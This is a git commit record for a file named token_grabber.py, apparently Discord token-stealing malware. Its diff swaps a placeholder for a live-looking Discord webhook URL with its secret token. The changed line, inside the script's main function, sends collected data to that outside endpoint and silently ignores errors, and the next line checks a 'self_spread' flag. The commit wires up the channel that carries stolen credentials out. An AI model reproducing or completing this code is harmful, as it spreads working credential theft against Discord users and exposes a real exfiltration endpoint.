9574aedbc0dadfb7d64d895fd7b1ccca50f0a00c
KhaledArea <121514727+KhaledArea@users.noreply.github.com>
2023-01-09 17:24:12 -0500

    token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1062126087750025287/78iQrlJb0SgHUMkSjVOBTFC5gAHJuRLGfIy0bNs9nLWcctBssWFjId4ya5N8telq-1eb", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
